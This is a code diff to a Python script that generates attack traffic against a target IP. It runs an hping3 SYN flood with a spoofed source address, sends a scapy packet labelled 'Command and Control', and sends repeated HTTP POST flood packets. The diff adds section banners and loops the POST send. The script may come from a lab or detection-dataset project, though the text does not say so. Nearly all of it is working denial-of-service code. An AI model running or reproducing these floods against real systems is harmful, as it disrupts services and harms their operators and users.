@@ -24,12 +24,22 @@ sendStr = 'POST /frasao HTTP/1.1\r\n'
 http_post_packet = Ether(dst=mac) / IP(src=font_ip, dst=target_ip) / TCP(dport=target_port, flags="S") / sendStr
 
 for j in range(30):
+    print("-"*100)
+    print("-"*45, "SYN Flood", "-"*45)
+    print("-"*100)
     subprocess.call(f'hping3 -c {c} -p {target_port} -i {i} -S -a {font_ip} {target_ip}', shell=True)
     sys.stdout.write(f'Tempo: {(time.perf_counter()-now):.2f}s\n')
     time.sleep(10)
 
+    print("-"*100)
+    print("-"*40, "Command and Control", "-"*40)
+    print("-"*100)
     sendp(http_request_packet)
     time.sleep(10)
 
-    sendp(http_post_packet)
+    print("-"*100)
+    print("-"*45, "HTTP Flood", "-"*45)
+    print("-"*100)
+    for i in range(c):
+        sendp(http_post_packet)
     time.sleep(10)
